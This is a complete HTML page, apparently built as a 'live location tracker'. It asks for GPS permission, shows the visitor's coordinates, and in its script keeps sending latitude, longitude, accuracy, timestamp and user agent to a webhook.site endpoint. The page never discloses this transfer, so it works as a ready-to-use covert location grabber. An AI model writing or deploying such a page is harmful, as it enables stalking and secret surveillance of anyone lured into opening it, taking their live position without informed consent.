<!DOCTYPE html>
<html>
<head>
  <title>Live Location Tracking</title>
  <meta charset="UTF-8">
</head>
<body>

<h3>Live Location Tracking</h3>
<p id="status">Tap the button to start GPS tracking.</p>
<p id="coords"></p>

<button onclick="startTracking()">Start Tracking</button>

<script>
function startTracking() {
  if (!navigator.geolocation) {
    document.getElementById("status").innerText =
      "Geolocation not supported on this device.";
    return;
  }

  document.getElementById("status").innerText =
    "Requesting GPS permission...";

  navigator.geolocation.watchPosition(
    (pos) => {
      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      document.getElementById("status").innerText =
        "Live tracking started.";

      document.getElementById("coords").innerText =
        `Latitude: ${data.latitude}
Longitude: ${data.longitude}
Accuracy: ${data.accuracy} meters`;

      fetch("https://webhook.site/8f979837-3de8-4935-b9c0-7e1d6d4e0125", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    },
    (err) => {
      document.getElementById("status").innerText =
        "Location permission denied or unavailable.";
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 15000
    }
  );
}
</script>

</body>
</html>
